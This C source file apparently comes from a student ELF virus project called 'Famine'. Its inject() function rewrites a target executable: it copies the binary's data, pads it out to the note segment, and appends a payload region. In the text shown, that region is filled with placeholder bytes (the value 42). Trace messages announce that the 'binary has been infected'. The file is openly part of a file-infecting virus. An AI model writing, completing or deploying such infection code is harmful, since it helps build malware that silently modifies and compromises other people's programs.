#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static void write_on_memory(const struct s_info *info, char *ptr)
{
	size_t index = 0;
	char *dst = ptr;
	char *src = info->ptr;
	
	while (index < info->data->p_offset + info->data->p_filesz)
	{
		*dst++ = *src++;
		index++;
	}
	while (index < info->note->p_offset)
	{
		*dst++ = 0;
		index++;
	}
	while (index < info->note->p_offset + PAYLOAD_SIZE)
	{
		*dst++ = 42;
		index++;
	}
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void inject(const struct s_info *info, const size_t m_entry, const int trace)
{
	char *ptr;
	(void)m_entry;
	
	if ((ptr = _mmap(NULL, info->note->p_offset + PAYLOAD_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
		Exit(0);

	write_on_memory(info, ptr);

	if (_write(info->fd, ptr, info->note->p_offset + PAYLOAD_SIZE) < 0)
		Exit(0);

	_munmap(ptr, info->note->p_offset + PAYLOAD_SIZE);

	// BEG_TRACE
	char buf1[] = "binary has been infected\n";
	_write(trace, buf1, _strlen(buf1));
	// END_TRACE

	// BEG_TRACE
	char buf2[] = "binary might be executed\n";
	_write(trace, buf2, _strlen(buf2));
	// END_TRACE
}
